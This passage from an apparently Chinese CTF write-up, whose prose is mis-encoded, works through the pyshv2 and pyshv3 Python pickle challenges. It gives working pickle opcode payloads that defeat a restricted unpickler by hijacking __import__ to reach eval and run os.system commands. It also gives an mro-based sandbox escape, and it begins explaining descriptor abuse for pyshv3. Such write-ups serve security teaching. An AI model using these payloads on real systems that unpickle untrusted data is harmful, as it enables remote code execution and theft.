function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-variable language_">self</span>.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br></code></pre></td></tr></table></figure>
<p>è¿™é“é¢˜éš¾åº¦æå‡äº†ä¸å°‘ã€‚é™åˆ¶å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>åªèƒ½å¼•å…¥ structs æ¨¡å—</li>
<li>æ–¹æ³•ä¸­ä¸èƒ½æœ‰ <code>.</code></li>
</ol>
<p>ä¸Šä¸€é“é¢˜åˆ©ç”¨æ–¹æ³•è¦†ç›–ï¼Œä¾èµ–çš„æ˜¯å¯å¼•å…¥æ¨¡å—ä¸­çš„æŸäº›ç‰¹æ®Šæ–¹æ³•ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹ <code>structs</code> éƒ½æœ‰å“ªäº›å±æ€§ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/58557963-7381-4e39-bfa1-d4bdcfcebee8.png!blog#width-zoom2" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å†çœ‹ä¸‹éƒ½æœ‰å“ªäº›æ–¹æ³•ï¼š</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/e400d051-3362-46e3-af15-d0095180097f.png!blog#width-zoom3" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p><code>__builtins__</code>ã€<code>__getattribute__</code> éƒ½æ˜¯å¥½ä¸œè¥¿ã€‚</p>
<p>æ€è·¯é¦–å…ˆå¯ä»¥æ˜¯ <code>structs.__builtins__["eval"]("__import__('os').system('whoami')")</code>ï¼Œå¯æ˜¯è¿™é‡Œçš„ <code>"eval"</code> æ˜¯ä¸å¥½ get çš„ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä»åå¾€å‰æ¨ã€‚</p>
<p><code>("__import__('os').system('whoami')")</code>ï¼Œè¿™ä¸ªå¥½è§£å†³ï¼Œç”¨ <code>c</code> å°±è¡Œäº†ã€‚é‡ç‚¹æ˜¯ <code>structs.__builtins__["eval"]</code> è¿™ä¸ªæ€ä¹ˆæå‡ºæ¥ã€‚ç”±äºè‡ªå®šä¹‰çš„ find_class ç”¨åˆ°äº† <code>__import__</code>ï¼Œæ‰€ä»¥ <code>cstructs\n__builtins__</code> å°±ä¼šæ‰§è¡Œ <code>__import__("structs")</code>ã€‚é‚£ä¹ˆå¯ä»¥è¿™æ ·ï¼Œé¦–å…ˆï¼Œç»™ structs åŠ ä¸€ä¸ªå±æ€§ï¼š<code>structs.__dict__["p0"] = structs.__builtins__</code>ï¼Œå†è§£å¼€ä¸€å±‚ï¼Œç»™ structs åŠ ä¸€ä¸ªå±æ€§ï¼š<code>structs.__dict__["p1"] = structs.__dict__["p0"].get</code>ï¼Œé‚£ä¹ˆ <code>cstructs\np1\n(Veval\ntR.</code> å°±ä¼šæ‰§è¡Œ <code>structs.__builtins__.get("eval")</code>ï¼Œæ‰€ä»¥è¿™é‡Œçš„ opcode å°±æ˜¯ï¼š<br />
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cstructs<span class="hljs-symbol">\n</span>__dict__<span class="hljs-symbol">\n</span>p0<br>(Vp0<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>__builtins__<span class="hljs-symbol">\n</span>s<br>(Vp1<span class="hljs-symbol">\n</span>g0.get<span class="hljs-symbol">\n</span>s  # è¿™é‡Œæ˜¯ä¸è¡Œçš„<br>cstructs<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>(Veval<span class="hljs-symbol">\n</span>tR(V__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure><br />
é—æ†¾çš„æ˜¯ï¼Œopcode æ˜¯ä¸æ”¯æŒç”¨ <code>.</code> æ¥å–å±æ€§/æ–¹æ³•çš„ã€‚</p>
<p>æ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±å˜æˆäº†ï¼Œ<code>.get</code> è¿™ä¸ªæ–¹æ³•æ€ä¹ˆæå‡ºæ¥ã€‚</p>
<p>å†çœ‹ä¸‹ find_classï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">module = <span class="hljs-built_in">__import__</span>(module)<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br></code></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥å¦‚æœ module æ˜¯ä¸€ä¸ªå­—å…¸çš„è¯ï¼Œé‚£ä¹ˆ name å°±å¯ä»¥ç½®ä¸º getï¼Œå³ <code>__import__("structs")</code> çš„ç»“æœåº”è¯¥æ˜¯ä¸€ä¸ªå­—å…¸ã€‚è€Œ <code>__import__</code> æ˜¯å¯ä»¥è¢«æ›¿æ¢çš„ï¼Œ<code>__getattribute__</code> å°±æ´¾ä¸Šäº†ç”¨åœºï¼Œä»¤ <code>structs.__builtins__['__import__'] = structs.__getattribute__</code>ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜å¾—ç»™ structs æ–°å¢ä¸€ä¸ª structs å±æ€§ï¼š<code>structs.__dict__["structs"] = structs.__builtins__</code>ã€‚</p>
<p>åˆ°è¿™é‡Œ:<br />
<code>__import__(module)</code> ç­‰äº<br />
<code>structs.__getattribute__("structs")</code> ç­‰äº<br />
<code>structs.__builtins__</code></p>
<p>æ‰€ä»¥ module å·²ç»æ˜¯ <code>structs.__builtins__</code> äº†ï¼Œåªéœ€è¦è®© <code>name = "get"</code> å³å¯æ‹¿åˆ° <code>eval</code>ï¼š<br />
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># get flag</span><br><br><span class="hljs-section"># æ”¶å·¥</span><br>\ntR.<br></code></pre></td></tr></table></figure></p>
<p>è¿™æ ·å³å¯è·å¾— flag<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> structs<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = [<span class="hljs-string">&quot;structs&quot;</span>]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        module = <span class="hljs-built_in">__import__</span>(module)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, name)<br><br><br>dumps = pickle.dumps<br><br>a = <span class="hljs-string">b&#x27;&#x27;&#x27;cstructs\n__dict__\nVstructs\ncstructs\n__builtins__\ns0cstructs\n__builtins__\nV__import__\ncstructs\n__getattribute__\ns0cstructs\nget\n(Veval\ntR(&#x27;&#x27;&#x27;</span> + \<br>    <span class="hljs-string">b&#x27;&#x27;&#x27;Vprint(open(&quot;./flag&quot;).read())\ntR.&#x27;&#x27;&#x27;</span><br>b = RestrictedUnpickler(io.BytesIO(a)).load()<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7803561-799c-4c0d-9e25-cee4ed6ac81d.png!blog#width-zoom5" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>å¦‚æœåªæ˜¯ä¸ºäº†æ‹¿åˆ° flagï¼Œç”¨ <code>open("./flag").read()</code> ä¹Ÿå¯ä»¥ã€‚ä½†æˆ‘ä»¬æ€»æ˜¯ä¼šæƒ³æƒ³èƒ½ä¸èƒ½ RCEï¼Œé‚£ä¹ˆè¿™é“é¢˜å¯ä»¥ RCE å—ï¼Ÿä½ å¯èƒ½ä¼šæƒ³ï¼Œopcode é‡Œé¢å·²ç»æŠŠ <code>__import__</code> æ±¡æŸ“äº†ï¼Œæ‰€ä»¥æ²¡æ³• import å…¶ä»–çš„åŒ…æ¥ RCEã€‚</p>
<p>å®é™…ä¸Šæ˜¯å¯ä»¥çš„ã€‚åŒæ ·ï¼Œåœ¨æˆ‘ä¹‹å‰å†™çš„ã€ŠPython æ²™ç®±é€ƒé€¸çš„ç»éªŒæ€»ç»“ã€‹ï¼ˆè§èµ„æ–™ 1ï¼‰é‡Œæœ‰ç”¨ mro æ¥å®ç°æ—  import æ‰§è¡Œä»»æ„å‘½ä»¤çš„æ–¹æ³•ã€‚æˆ‘è¿™é‡Œå°±ä¸å•°å—¦äº†ï¼Œç›´æ¥ç»™å‡º opcodeï¼š<br />
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section"># structs.<span class="hljs-strong">__dict__</span>[&quot;structs&quot;] = structs.<span class="hljs-strong">__builtins__</span></span><br>cstructs\n<span class="hljs-strong">__dict__</span>\nVstructs\ncstructs\n<span class="hljs-strong">__builtins__</span>\ns0<br><br><span class="hljs-section"># structs.<span class="hljs-strong">__builtins__</span>[&#x27;<span class="hljs-strong">__import__</span>&#x27;] = structs.<span class="hljs-strong">__getattribute__</span></span><br>cstructs\n<span class="hljs-strong">__builtins__</span>\nV<span class="hljs-strong">__import__</span>\ncstructs\n<span class="hljs-strong">__getattribute__</span>\ns0<br><br><span class="hljs-section"># get eval</span><br>cstructs\nget\n(Veval\ntR(V<br><br><span class="hljs-section"># åˆ©ç”¨ mro å¯»æ‰¾å¯åˆ©ç”¨çš„æ¨¡å—ï¼Œè¿™é‡Œä»¥ sys ä¸ºä¾‹</span><br>[<span class="hljs-string">x for x in [</span>].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() if x.<span class="hljs-strong">__name__</span> == &quot;<span class="hljs-emphasis">_Printer&quot;][0]._</span>Printer<span class="hljs-strong">__setup.__</span>globals<span class="hljs-strong">__[&#x27;sys&#x27;].modules.get(&quot;os&quot;).system(&quot;whoami&quot;)</span><br><span class="hljs-strong"></span><br><span class="hljs-strong"># æ”¶å·¥</span><br><span class="hljs-strong">\ntR.</span><br></code></pre></td></tr></table></figure></p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34d78bf0-8b15-40ec-9119-63a6f7bc15b9.png!blog#width-zoom7" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<h3 id="pyshv3">pyshv3</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ----- securePickle.py ----- </span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><br><br>whitelist = []<br><br><br><span class="hljs-comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-keyword">if</span> module <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> whitelist <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>            <span class="hljs-keyword">raise</span> KeyError(<span class="hljs-string">&#x27;The pickle is spoilt :(&#x27;</span>)<br>        <span class="hljs-keyword">return</span> pickle.Unpickler.find_class(<span class="hljs-variable language_">self</span>, module, name)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br><br>dumps = pickle.dumps<br><br><br><br><span class="hljs-comment">#  ----- server.py ----- </span><br><span class="hljs-keyword">import</span> securePickle <span class="hljs-keyword">as</span> pickle<br><span class="hljs-keyword">import</span> codecs<br><span class="hljs-keyword">import</span> os<br><br><br>pickle.whitelist.append(<span class="hljs-string">&#x27;structs&#x27;</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Pysh</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.key = os.urandom(<span class="hljs-number">100</span>)<br>        <span class="hljs-variable language_">self</span>.login()<br>        <span class="hljs-variable language_">self</span>.cmds = &#123;<br>            <span class="hljs-string">&#x27;help&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_help,<br>            <span class="hljs-string">&#x27;whoami&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_whoami,<br>            <span class="hljs-string">&#x27;su&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_su,<br>            <span class="hljs-string">&#x27;flag&#x27;</span>: <span class="hljs-variable language_">self</span>.cmd_flag,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            flag = f.read()<br>        flag = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.key, flag))<br>        user = <span class="hljs-built_in">input</span>().encode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br>        user = codecs.decode(user, <span class="hljs-string">&#x27;base64&#x27;</span>)<br>        user = pickle.loads(user)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Login as &#x27;</span> + user.name + <span class="hljs-string">&#x27; - &#x27;</span> + user.group)<br>        user.privileged = <span class="hljs-literal">False</span><br>        user.flag = flag<br>        <span class="hljs-variable language_">self</span>.user = user<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            req = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;$ &#x27;</span>)<br>            func = <span class="hljs-variable language_">self</span>.cmds.get(req, <span class="hljs-literal">None</span>)<br>            <span class="hljs-keyword">if</span> func <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;pysh: &#x27;</span> + req + <span class="hljs-string">&#x27;: command not found&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                func()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_help</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Available commands: &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-variable language_">self</span>.cmds.keys()))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_whoami</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-variable language_">self</span>.user.name, <span class="hljs-variable language_">self</span>.user.group)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_su</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not Implemented QAQ&quot;</span>)<br>        <span class="hljs-comment"># self.user.privileged = 1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd_flag</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.user.privileged:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag: Permission denied&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<span class="hljs-variable language_">self</span>.user.flag, <span class="hljs-variable language_">self</span>.key)))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pysh = Pysh()<br>    pysh.run()<br><br><br><br><span class="hljs-comment">#  ----- structs.py ----- </span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.group = group<br>        <span class="hljs-variable language_">self</span>.isadmin = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.prompt = <span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>è¿™é“é¢˜ä¹Ÿæ¯”è¾ƒéš¾ã€‚é™åˆ¶å¦‚ä¸‹ï¼š</p>
<ol type="1">
<li>åªèƒ½å¼•å…¥ structs æ¨¡å—</li>
<li>æ–¹æ³•ä¸­ä¸èƒ½æœ‰ <code>.</code></li>
<li>æ— æ³• import é¢å¤–çš„æ¨¡å—ã€‚æ‰€ä»¥è¦æƒ³æ‹¿åˆ° flagï¼Œ<code>self.user.privileged</code> éœ€è¦ä¸ä¸º False</li>
</ol>
<p>ç”±äº <code>user.privileged = False</code> æ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åè¿è¡Œçš„ï¼Œæ‰€ä»¥å°±ç®—è¦†ç›–äº† struct çš„ privilegedï¼Œä¹Ÿä¼šè¢«å¼ºåˆ¶æ”¹å›æ¥ã€‚</p>
<p>æˆ‘ä»¬çŸ¥é“ï¼ŒPython çš„ç‚¹è¿ç®—ç¬¦ï¼ŒèƒŒåå®é™…ä¸Šæ˜¯å„ç§æè¿°å™¨åœ¨èµ·ä½œç”¨ï¼Œè€Œæè¿°å™¨å…¶å®ç”± <code>__getattribute__()</code> æ–¹æ³•è°ƒç”¨çš„ã€‚æ‰€ä»¥è¿™é‡Œçš„æ€è·¯å°±æ˜¯ä¿®æ”¹æè¿°å™¨ä½¿å¾— <code>.</code> çš„è¡Œä¸ºå¯æ§ã€‚å¯¹äºæè¿°å™¨æˆ‘ä»¬å¹¶ä¸é™Œç”Ÿï¼Œå¦‚æœä½ æ²¡ç”¨è¿‡ï¼Œå¯ä»¥çœ‹ä¸‹å®˜æ–¹æ–‡æ¡£ï¼Œè§èµ„æ–™ 8ã€‚</p>
<p>å¦‚æœä¸€ä¸ªå¯¹è±¡å®šä¹‰äº† <code>__set__()</code> æˆ– <code>__delete__()</code>ï¼Œåˆ™å®ƒä¼šè¢«è§†ä¸ºæ•°æ®æè¿°å™¨ã€‚ ä»…å®šä¹‰äº† <code>__get__()</code> çš„æè¿°å™¨ç§°ä¸ºéæ•°æ®æè¿°å™¨ã€‚</p>
<p>å…¶ä¸­ï¼Œ<code>__set__()</code> å†³å®šäº†èµ‹å€¼æ—¶çš„è¡Œä¸ºï¼Œæ‰€ä»¥æˆ‘ä»¬èƒ½ä¸èƒ½é€šè¿‡é‡è½½ <code>__set__</code> ä½¿å¾— <code>user.privileged = False</code> å¤±æ•ˆå‘¢ï¼Ÿ</p>
<p>é‚£ä¹ˆè¿™ä¸ªæ—¶å€™å¯ä»¥ç­‰ä»·ä¸ºï¼š<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        <span class="hljs-variable language_">self</span>.name = name<br>        <span class="hljs-variable language_">self</span>.group = group<br>        <span class="hljs-variable language_">self</span>.isadmin = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.prompt = <span class="hljs-string">&#x27;&#x27;</span><br><br><br>user = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br><span class="hljs-comment"># åœ¨è¿™é‡Œé¢å†™å…¥åˆé€‚çš„è¯­å¥</span><br><br>user.privileged = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(user.privileged)  <span class="hljs-comment"># ä½¿å¾— user.privileged == True</span><br></code></pre></td></tr></table></figure></p>
<p>é¦–å…ˆï¼Œ<code>__set__</code> åº”è¯¥èµ‹äºˆä¸€ä¸ª callableï¼ˆ<del>åºŸè¯</del>ï¼‰ï¼Œè¿™ä¸ª callable æ˜¯æ¯”è¾ƒæœ‰è®²ç©¶çš„ï¼š</p>
<ol type="1">
<li>å¿…é¡»è¦æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰§è¡Œ <code>user.privileged = False</code> çš„æ—¶å€™ï¼Œåˆ†ä¸ºç”¨äºæ¥æ”¶ <code>user</code>ã€<code>privileged</code>ã€<code>False</code></li>
<li>è¿”å›å€¼å¿…é¡»ä¸ä¸ºå¹¿ä¹‰çš„ Falseï¼ˆä»€ä¹ˆ None å•Šã€"" å•Šï¼Œéƒ½ç®—å¹¿ä¹‰çš„ Falseï¼‰</li>
<li>è°ƒç”¨çš„æºå¤´å¿…é¡»åœ¨ä¸€ä¸ªç±»ä¸­</li>
</ol>
<p>é‚£ä¹ˆåœ¨è¿™é“é¢˜ç›®ä¸­ï¼ŒUser è¿™ä¸ªç±»æœ¬èº«æ­£å¥½ç¬¦åˆè¦æ±‚ï¼Œæ‰€ä»¥å¯ä»¥è¿™ä¹ˆå†™ï¼š<code>User.__set__ = User</code>ã€‚ä½†æ˜¯å¦‚æœåªå†™è¿™ä¸€å¥çš„è¯ï¼Œä½ ä¼šå‘ç°è¿˜æ˜¯æ— æ³•æ”¹å˜ <code>user.privileged = False</code> çš„è¡Œä¸ºã€‚</p>
<p>è¿™ä¸ªæ—¶å€™å°±éœ€è¦çœ‹ä¸‹ <code>__set__</code> åˆ°åº•å¦‚ä½•æ”¹å˜ Python èµ‹å€¼è¡Œä¸ºçš„ã€‚å¯¹äº <code>obj.attr = value</code>ï¼ˆåœ¨å¯¹å±æ€§èµ‹å€¼æ—¶ï¼‰ï¼ŒPython çš„æŸ¥æ‰¾ç­–ç•¥æ˜¯è¿™æ ·çš„ï¼šæŸ¥æ‰¾ <code>obj.__class__.__dict__</code>ï¼Œå¦‚æœ attr å­˜åœ¨å¹¶ä¸”æ˜¯ä¸€ä¸ªæ•°æ®æè¿°å™¨ï¼Œè°ƒç”¨ attr çš„ <code>__set__</code> æ–¹æ³•ï¼Œç»“æŸã€‚å¦‚æœä¸å­˜åœ¨ï¼Œä¼šç»§ç»­åˆ° <code>obj.__class__</code> çš„çˆ¶ç±»å’Œç¥–å…ˆç±»ä¸­æŸ¥æ‰¾ï¼Œæ‰¾åˆ°æ•°æ®æè¿°å™¨åˆ™è°ƒç”¨å…¶ <code>__set__</code> æ–¹æ³•ï¼Œæ²¡æ‰¾åˆ°åˆ™æ‰§è¡Œ <code>obj.__dict__['attr'] = value</code>ã€‚</p>
